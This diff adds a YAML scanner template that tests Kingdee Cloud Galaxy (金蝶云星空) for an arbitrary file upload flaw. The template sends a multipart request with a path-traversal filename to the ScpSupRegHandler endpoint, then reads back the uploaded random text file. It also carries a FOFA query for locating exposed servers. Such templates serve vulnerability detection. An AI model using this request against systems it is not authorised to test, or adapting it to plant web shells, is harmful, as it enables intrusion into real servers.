@@ -1,0 +1,60 @@
+id: poc-yaml-jin-die-yun-ScpSupRegHandler-anyfile-upload
+info:
+  name: 金蝶云星空 ScpSupRegHandler 任意文件上传漏洞
+  author: ProjectDiscoveryAI
+  severity: high
+  tags: file-upload
+  metadata:
+    finger: 金蝶云星空
+    fofa-query: "icon_hash=\"-1629133697\" && title==\"金蝶云星空\""
+
+variables:
+  t1: "{{rand_text_alpha(4)}}"
+  t2: "{{rand_text_alpha(5)}}"
+
+flow: |
+  http(1) && http(2)
+
+http:
+  - id: upload-file
+    method: POST
+    path:
+      - "{{BaseURL}}/k3cloud/SRM/ScpSupRegHandler"
+    headers:
+      Content-Type: "multipart/form-data; boundary=----WebKitFormBoundaryQdfX5jWoua4EnUeu"
+    body: |-
+      ------WebKitFormBoundaryQdfX5jWoua4EnUeu
+      Content-Disposition: form-data; name="dbId_v"
+
+      .
+      ------WebKitFormBoundaryQdfX5jWoua4EnUeu
+      Content-Disposition: form-data; name="FID"
+
+      2023
+      ------WebKitFormBoundaryQdfX5jWoua4EnUeu
+      Content-Disposition: form-data; name="FAtt"; filename="../../../../uploadfiles/{{t1}}.txt."
+      Content-Type: text/plain
+
+      {{t2}}
+      ------WebKitFormBoundaryQdfX5jWoua4EnUeu--
+    matchers-condition: and
+    matchers:
+      - type: status
+        status:
+          - 200
+      - type: word
+        words:
+          - "附件保存成功"
+
+  - id: verify-upload
+    method: GET
+    path:
+      - "{{BaseURL}}/k3cloud/uploadfiles/{{t1}}.txt"
+    matchers-condition: and
+    matchers:
+      - type: status
+        status:
+          - 200
+      - type: word
+        words:
+          - "{{t2}}"
